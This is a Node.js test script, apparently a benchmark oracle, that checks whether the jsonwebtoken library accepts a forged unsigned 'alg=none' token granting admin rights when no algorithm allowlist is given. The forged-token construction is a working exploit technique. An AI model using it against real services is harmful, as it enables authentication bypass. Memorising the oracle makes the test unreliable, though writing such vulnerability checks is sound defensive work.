const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign operation: normal HS256 sign/verify should succeed.
  const benignSecret = 'benign-secret';
  const benignToken = jwt.sign({ sub: 'user123', ok: true }, benignSecret, { algorithm: 'HS256' });
  const benignOut = jwt.verify(benignToken, benignSecret, { algorithms: ['HS256'] });
  if (!benignOut || benignOut.sub !== 'user123' || benignOut.ok !== true) {
    throw new Error('benign HS256 verify failed');
  }

  operation_completed = true;

  // Malicious operation: algorithm confusion / insecure default algorithm selection.
  // Build an unsigned token with alg=none and verify without an explicit algorithm allowlist.
  const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
  const payloadObj = { sub: 'attacker', admin: true, iat: 1700000000 };
  const payload = Buffer.from(JSON.stringify(payloadObj)).toString('base64url');
  const forgedNoneToken = header + '.' + payload + '.';

  try {
    const out = jwt.verify(forgedNoneToken, 'any-non-empty-secret');
    if (out && out.sub === 'attacker' && out.admin === true) {
      exploit_succeeded = true;
      evidence = 'verify accepted forged alg=none token without explicit algorithms restriction';
    } else {
      exploit_succeeded = false;
      evidence = 'malicious token produced unexpected payload';
    }
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious verify rejected: ' + (e && e.message ? e.message : String(e));
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (e && e.message ? e.message : String(e));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));